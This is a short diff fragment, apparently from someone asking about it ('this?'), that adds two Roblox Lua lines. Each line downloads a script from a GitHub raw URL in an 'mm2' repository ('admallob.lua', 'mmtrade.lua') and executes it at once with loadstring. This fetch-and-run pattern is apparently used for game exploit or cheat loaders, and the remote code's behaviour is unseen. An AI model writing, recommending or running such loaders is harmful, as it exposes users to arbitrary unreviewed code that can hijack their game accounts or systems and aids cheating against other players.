@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ggiannino435-spec/mm2/refs/heads/main/admallob.lua"))()
+loadstring(game:httpget("https://raw.githubusercontent.com/xxyourzetazoeysoulxxillycod/mm2scripts/refs/heads/main/mmtrade.lua"))() this?
